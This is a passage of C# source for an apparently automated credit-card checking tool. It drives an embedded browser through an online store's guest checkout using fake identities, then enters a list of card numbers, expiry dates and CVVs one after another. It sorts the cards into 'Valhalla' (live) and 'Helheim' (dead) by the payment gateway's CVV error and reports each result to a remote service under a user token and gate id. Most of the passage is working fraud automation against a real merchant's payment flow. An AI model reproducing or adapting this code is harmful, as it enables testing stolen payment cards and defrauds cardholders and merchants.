        //        //await browser.Screenshot("4.AddToCart");
        //        await ConsoleProgressGeneral("Invirtiendo escalafón profesional.", 40);
        //        await browser.DisableAlerts();
        //        string clickViewcart = @"document.querySelector('p.gritter-link.linkEase > a').click();";
        //        await browser.ExecuteScript(clickViewcart);
        //    }
        //    catch (Exception) { }

        //    bool anchorCheckout = await browser.ElementVisible("#btnCheckoutTop", "ExceptionViewCart");
        //    if (anchorCheckout)
        //    {
        //        return await Checkout();
        //    }
        //    await ConsoleProgressGeneral("Invirtiendo escalafón profesional. ¡Fallo!", 40, "Fail");
        //    return false;

        //}

        private async Task<bool> Cart()
        {

            try
            {
                await browser.Screenshot("5.Cart");
                await ConsoleProgressGeneral("Interrelacionando distribución regular de caos.", 40);
                await browser.DisableAlerts();
                browser.Load($"https://{web}/cart");
            }
            catch (Exception) { }

            bool buttonGoToCheckout = await browser.ElementVisible("#root > main > div.main-page-1Ex > div > div > div.cartPage-summary_container-2pt > div.priceSummary-summarySection-1R- > div.priceSummary-btnArea-2th > div > button", "5.ExceptionCheckout");
            if (buttonGoToCheckout)
            {
                return await Checkout();
            }
            await ConsoleProgressGeneral("Interrelacionando distribución regular de caos. ¡Fallo!", 40, "Fail");
            return false;

        }

        private async Task<bool> Checkout()
        {

            try
            {
                await browser.Screenshot("5.Checkout");
                await ConsoleProgressGeneral("Interrelacionando distribución regular de caos.", 40);
                await browser.DisableAlerts();//
                                              // browser.Load($"https://{web}/checkout");
                string clickCheckout = @"document.querySelector('#root > main > div.main-page-1Ex > div > div > div.cartPage-summary_container-2pt > div.priceSummary-summarySection-1R- > div.priceSummary-btnArea-2th > div > button').click();";
                await browser.ExecuteScript(clickCheckout);
            }
            catch (Exception) { }
            //#root > aside:nth-child(10) > div.checkoutProcess-body-2hF > button.guestCheckout
            bool buttonGuestCheckout = await browser.ElementVisible("#root > aside:nth-child(10) > div.checkoutProcess-body-2hF > button.guestCheckout", "5.ExceptionCheckout");
            if (buttonGuestCheckout)
            {
                return await GuestCheckout();
            }

            await ConsoleProgressGeneral("Interrelacionando distribución regular de caos. ¡Fallo!", 40, "Fail");
            return false;

        }

        private async Task<bool> GuestCheckout()
        {
            try
            {
                await browser.Screenshot("5.GuestCheckout");
                await ConsoleProgressGeneral("Interrelacionando distribución regular de caos.", 40);
                await browser.DisableAlerts();//
                                              // browser.Load($"https://{web}/checkout");
                string clickGuestCheckout = @"document.querySelector('#root > aside:nth-child(10) > div.checkoutProcess-body-2hF > button.guestCheckout').click();";
                await browser.ExecuteScript(clickGuestCheckout);
            }
            catch (Exception) { }

            bool inputEmail = await browser.ElementVisible("#js-checkoutForm > div.guestForm-email-1Xd > div > span > span.fieldIcons-input-11Y > input", "5.ExceptionGuestCheckout");
            if (inputEmail)
            {
                return await ShippingDetails();
            }

            await ConsoleProgressGeneral("Interrelacionando distribución regular de caos. ¡Fallo!", 40, "Fail");
            return false;

        }

        //#root > aside:nth-child(10) > div.checkoutProcess-body-2hF > button.guestCheckout
        private async Task<bool> ShippingDetails()
        {

            try
            {
                await browser.Screenshot("6.ShippingDetails");
                await ConsoleProgressGeneral("Reconfiguración de los algoritmos genéticos.", 50);
                await browser.DisableAlerts();
                //#js-checkoutForm > div.guestForm-email-1Xd > div > span > span.fieldIcons-input-11Y > input
                await browser.SendKeys("input[name=email]", Faker.Internet.Email());
                await Task.Delay(500);
                await browser.SendKeys("#js-checkoutForm > div.guestForm-firstname-2Vj > div > span > span.fieldIcons-input-11Y > input", Faker.Name.FirstName());
                await Task.Delay(500);
                await browser.SendKeys("#js-checkoutForm > div.guestForm-lastname-1_A > div > span > span.fieldIcons-input-11Y > input", Faker.Name.LastName());
                await Task.Delay(500);
                await browser.SendKeys("#react-google-places-autocomplete-input", Faker.Address.StreetAddress());
                await browser.SendKeys("#js-checkoutForm > div.guestForm-street1-3_7 > div > span > span.fieldIcons-input-11Y > input", Faker.Address.SecondaryAddress());
                await Task.Delay(500);
                await browser.SendKeys("#js-checkoutForm > div.guestForm-city-1bh > div > span > span.fieldIcons-input-11Y > input", Faker.Address.City());
                await Task.Delay(500);
                await browser.SendKeys("#js-checkoutForm > div.guestForm-region-1US > div > select", Faker.Address.StateAbbr());
                await Task.Delay(500);
                await browser.SendKeys("#js-checkoutForm > div.guestForm-postcode-1ip > div > span > span.fieldIcons-input-11Y > input", Faker.Address.ZipCode("#####"));
                await Task.Delay(500);
                await browser.SendKeys("#js-checkoutForm > div.guestForm-telephone-3WS > div > span > span.fieldIcons-input-11Y > input", Faker.Phone.PhoneNumber());
                await Task.Delay(5000);
                //await browser.Click("#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-shipping_information_container-1Ro > div.shippingMethod-root-1QK > form > div.shippingMethod-formButtons-tac > button");

                //string clickButtonSaveContinue = @"document.querySelector('#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-shipping_information_container-1Ro > div.shippingMethod-root-1QK > form > div.shippingMethod-formButtons-tac > button').click();";
                //await browser.ExecuteScript(clickButtonSaveContinue);
            }
            catch (Exception) { }

            bool buttonSaveAndContinue = await browser.ElementVisible("#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-shipping_information_container-1Ro > div.shippingMethod-root-1QK > form > div.shippingMethod-formButtons-tac > button", "6.ExceptionLogin", 40);
            if (buttonSaveAndContinue)
            {
                return await SaveAndContinue();
            }

            await ConsoleProgressGeneral("Reconfiguración de los algoritmos genéticos. ¡Fallo!", 50, "Fail");
            return false;
        }

        private async Task<bool> SaveAndContinue()
        {
            try
            {
                await browser.Screenshot("7.SaveAndContinue");
                await ConsoleProgressGeneral("Recalibración del motor de motivación.", 70);
                await browser.DisableAlerts();
                await browser.Click("#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-shipping_information_container-1Ro > div.shippingMethod-root-1QK > form > div.shippingMethod-formButtons-tac > button");
            }
            catch (Exception) { }

            bool spanPaymentMethod = await browser.ElementVisible("#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-payment_information_container-3zC > form > div > div > div > div:nth-child(3) > div > div.checkoutPage-place_order_button_wrap-1qi > span > button", "6.ExceptionSaveAndContinue");
            if (spanPaymentMethod)
            {
                await Task.Delay(5000);
                await browser.Screenshot("8.PaymentMethod");
                // return await Shipping();
                return await Last();
            }
            else
            {
                bool buttonSaveAndContinue = await browser.ElementVisible("#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-shipping_information_container-1Ro > div.shippingMethod-root-1QK > form > div.shippingMethod-formButtons-tac > button", "6.ExceptionLogin", 40);
                if (buttonSaveAndContinue)
                {
                    return await SaveAndContinue();
                }
            }
            await ConsoleProgressGeneral("Recalibración del motor de motivación. ¡Fallo!", 70, "Fail");
            return false;

        }

        private async Task<bool> Last()
        {
            try
            {
                await browser.Screenshot("8.Last");
                await ConsoleProgressGeneral("Difundiendo rumores.", 70);
                string listLiveCreditCard = string.Empty;
                string listDieCreditCard = string.Empty;
                if (CreditCards.Count > 0)
                {
                    LiveCreditCards = new List<List<string>>();
                    DieCreditCards = new List<List<string>>();
                    int creditCardsCount = CreditCards.Count;
                    int x = 0;
                    for (int i = 0; i < creditCardsCount;)
                    {
                        await ConsoleProgressDetail("Sintetización de la selección natural.", 0);
                        string number = CreditCards[i][0];
                        string month = CreditCards[i][1];
                        //string month = CreditCards[i][1];
                        //string year = CreditCards[i][2].Substring(CreditCards[i][2].Length, 1);
                        string year = CreditCards[i][2].Substring(2, 2);
                        string cvv = CreditCards[i][3];
                        //string cvv = string.Empty;
                        //if (CreditCards[i][3].Length == 4)
                        //{
                        //    cvv = "0000";
                        //}
                        //else
                        //{
                        //    cvv = "000";
                        //}

                        bool card = await Card(number, month, year, cvv);
                        if (card)
                        {
                            bool forseti = await Forseti();
                            if (forseti)
                            {
                                await browser.Screenshot(x.ToString() + ".Valhalla_" + number);
                                await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100, "Success");
                                if (TextBoxValhalla.Text == string.Empty)
                                {
                                    listLiveCreditCard += string.Join("|", CreditCards[i].ToArray());
                                    await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                }
                                else
                                {
                                    listLiveCreditCard = TextBoxValhalla.Text;
                                    listLiveCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
                                    await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                }
                                await Task.Delay(5000);
                                await Block();
                                await ReduceListCreditCards();
                                TextBoxValhalla.Text = listLiveCreditCard;
                                double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
                                await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(progress));
                                await Task.Delay(50);
                                x++;
                                return false;
                            }
                            else
                            {
                                if (!forsetiError)
                                {
                                    await browser.Screenshot(x.ToString() + ".Helheim_" + number);
                                    await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100, "Fail");
                                    if (TextBoxHelheim.Text == string.Empty)
                                    {
                                        listDieCreditCard += string.Join("|", CreditCards[i].ToArray());
                                        await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                    }
                                    else
                                    {
                                        listDieCreditCard = TextBoxHelheim.Text;
                                        listDieCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
                                        await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                    }
                                    //await Task.Run(() => home.LoadCountHelheim());
                                    await ReduceListCreditCards();
                                    TextBoxHelheim.Text = listDieCreditCard;
                                    double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
                                    await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(progress));
                                    await Task.Delay(50);
                                    x++;
                                    continue;
                                }
                                else
                                {
                                    forsetiError = false;
                                    return false;
                                }
                            }
                        }
                        //x++;
                    }
                }
            }
            catch (Exception) { }

            if (CreditCards.Count > 0)
            {
                await ConsoleProgressGeneral("Difundiendo rumores. ¡Fallo!", 90, "Fail");
                return false;
            }
            return true;
        }


        private async Task<bool> Card(string number, string month, string year, string cvv)
        {
            try
            {
                await browser.Screenshot("9.Card");
                await ConsoleProgressGeneral("Incremento de las conductas laborales.", 60);
                await browser.DisableAlerts();
                await browser.ClickXY(214, 46);
                await Task.Delay(500);
                if (firstTime)
                {
                    await browser.ClickXY(90, 460);
                    firstTime = false;
                }
                else
                {
                    await browser.ClickXY(90, 510);
                }
                await Task.Delay(500);
                await browser.SendKeys(string.Empty, number);
                await browser.SendKeyCode(0x09);
                await Task.Delay(500);
                await browser.SendKeys(string.Empty, month);
                await browser.SendKeys(string.Empty, year);
                await browser.SendKeyCode(0x09);
                await Task.Delay(500);
                await browser.SendKeys(string.Empty, cvv);
                await Task.Delay(500);
                await browser.Screenshot("9.CardFill");
                await browser.ExecuteScript("document.querySelector('#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-payment_information_container-3zC > form > div > div > div > div:nth-child(3) > div > div.checkoutPage-place_order_button_wrap-1qi > span > button').click()");
            }
            catch (Exception) { }

            bool divError = await browser.ElementVisible("#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div", "6.ExceptionCard");
            if (divError)
            {
                return true;
            }
            else
            {
                return true;
            }
            await ConsoleProgressGeneral("Incremento de las conductas laborales. ¡Fallo!", 60, "Fail");
            return false;
        }

        private async Task<bool> Forseti()
        {
            try
            {
                await browser.Screenshot("10.Forseti");
                await ConsoleProgressDetail("Insuflando furia subatómica.", 90);
                await browser.DisableAlerts();
                bool valhalla = await browser.ElementInnerTextContent("#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div > span", "Gateway Rejected: cvv", "10.ExceptionValhalla");
                if (valhalla)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception) { }
            await ConsoleProgressDetail("Insuflando furia subatómica. ¡Fallo!", 90, "Fail");
            forsetiError = true;
            return false;
        }

        private async Task<bool> CorrectAddress()
        {
            try
            {
                await browser.Screenshot("6.5.CorrectAddress");
                await ConsoleProgressGeneral("Invirtiendo escalafón profesional.", 65);
                string clickInputRandomAddres = @"let addresses = document.querySelectorAll('input[name=qas-address]:not(#qas-address-oops)');
                        let address = addresses[Math.floor(Math.random() * (addresses.length))];
                        adress.click()";
                await browser.ExecuteScript(clickInputRandomAddres);
                await Task.Delay(1000);
                await browser.ExecuteScript("document.querySelector('#btnQASContinue').click()");
            }
            catch (Exception) { }

            bool inputCreditCard = await browser.ElementVisible("#txtCreditCardNumber", "6.5.ExceptionCorrectAddress");
            if (inputCreditCard)
            {
                return await Last();
            }

            await ConsoleProgressGeneral("Invirtiendo escalafón profesional. ¡Fallo!", 65, "Fail");
            return false;
        }
        #endregion

        #region Methods
        private async Task ReduceListCreditCards()
        {
            try
            {
                CreditCards.RemoveAt(0);
                string listCreditCard = string.Empty;
                int creditCardsCount = CreditCards.Count;
                for (int y = 0; y < creditCardsCount; y++)
                {
                    if (CreditCards.Count > 0)
                    {
                        if (y < CreditCards.Count - 1)
                        {
                            listCreditCard += string.Join("|", CreditCards[y].ToArray()) + "\r\n";
                        }
                        else
                        {
                            listCreditCard += string.Join("|", CreditCards[y].ToArray());
                        }
                    }
                    else
                    {
                        listCreditCard = string.Empty;
                    }
                    await Task.Delay(100);
                }
                TextBoxCreditCards.Text = listCreditCard;
            }
            catch (Exception) { }
        }

        private async Task<bool> Payment(string number, string month, string year, string cvv)
        {
            try
            {
                await browser.Screenshot("8.Payment");

                await ConsoleProgressDetail("Inicializando sociedades secretas.", 50);
                await browser.DisableAlerts();

                await browser.JsSendKeys("#txtCreditCardNumber", string.Empty);
                await Task.Delay(500);
                await browser.JsSendKeys("#txtCreditCardNumber", number);
                await Task.Delay(500);
                await browser.ExecuteScript($"document.querySelector('#ccExpirationMonth').selectedIndex = {month}");
                await Task.Delay(500);
                await browser.ExecuteScript($"document.querySelector('#ccExpirationYear').selectedIndex = {year}");
                await Task.Delay(500);
                await browser.JsSendKeys("#txtCVV", string.Empty);
                await Task.Delay(500);
                await browser.JsSendKeys("#txtCVV", cvv);
                await Task.Delay(500);
                //await browser.Scroll(0, 500);
                //await browser.Scroll(200, 500);
                await browser.JsSendKeys("#txtPhone", string.Empty);
                await Task.Delay(500);
                await browser.JsSendKeys("#txtPhone", Faker.Phone.PhoneNumber());
                await Task.Delay(500);
                await browser.ExecuteScript("document.querySelector('#btnSaveAndContinue').click()");

            }
            catch (Exception) { }

            bool buttonOk = await browser.ElementVisible("div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input", "ExceptionLastButtonOk");
            if (buttonOk)
            {
                return true;
            }
            else
            {
                bool spanCreditCardNumber = await browser.ElementInnerTextContent("#spnCreditCardNumber", "xxxx", "8.ExceptionLastButtonPlaceOrder");
                if (spanCreditCardNumber)
                {
                    await ClickPlaceOrder();
                    return true;
                }
            }
            await ConsoleProgressDetail("Inicializando sociedades secretas.", 50, "Fail");
            return false;

        }

        private async Task ClickButtonOK()
        {

            try
            {
                await browser.Screenshot("9.ClickButtonOK");
                await browser.DisableAlerts();
                string clickOk = @"document.querySelector('div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input').click();";
                await browser.ExecuteScript(clickOk);
            }
            catch (Exception) { }
        }

        private async Task ClickPlaceOrder()
        {
            try
            {
                await browser.Screenshot("9.ClickPlaceOrder");
                await browser.Scroll(0, 500);
                await browser.Scroll(100, 500);
                string buttonPlaceOrder = @"document.querySelector('#btnPlaceOrder').click();";
                await browser.ExecuteScript(buttonPlaceOrder);
            }
            catch (Exception) { }
        }




        private async Task EditPayment()
        {
            try
            {
                await browser.Screenshot("11.EditPayment");
                string clickButtonOk = @"document.querySelector('#ctl00_bodytag > div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input').click();";
                await browser.ExecuteScript(clickButtonOk);
                await Task.Delay(1000);
                await browser.ExecuteScript("document.querySelector('#lnkCCEdit').click()");
            }
            catch (Exception) { }
        }

        #endregion

        #endregion

        private void iconButton1_Click(object sender, EventArgs e)
        {
            var visitor = new CookieMonster(all_cookies =>
            {
                var sb = new StringBuilder();
                foreach (var nameValue in all_cookies)
                    sb.AppendLine(nameValue.Item1 + " = " + nameValue.Item2);
                BeginInvoke(new MethodInvoker(() => { MessageBox.Show(sb.ToString()); }));
            });

            Cef.GetGlobalCookieManager().VisitAllCookies(visitor);
        }

        private void IconButtonConfirmClose_Click(object sender, EventArgs e)
        {
            PanelConfirm.Hide();
        }

        private void IconButtonCancel_Click(object sender, EventArgs e)
        {
            PanelConfirm.Hide();
        }

        private void TextBoxValhalla_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control && e.KeyCode == Keys.C)
            {
                e.SuppressKeyPress = false;
            }
            else if (e.Control && e.KeyCode == Keys.X)
            {
                e.SuppressKeyPress = false;
            }
            else
            {
                e.SuppressKeyPress = true;
                return;
            }
        }

        private async Task Block()
        {
            bool block = await Asatru.BlockAesir(UserId, 1, Token);
            if (block)
            {
                PanelBlockGate.Show();
                await IconButtonBlockGateClose.OnClickAsync();
                Owner.HideIconActive("odin");
                PanelBlockGate.Hide();
                if (browser != null)
                {
                    await browser.Kill(web);
                }
                this.Close();
            }
        }

        private void PanelBlockGate_Paint(object sender, PaintEventArgs e)
        {

        }
    }
}
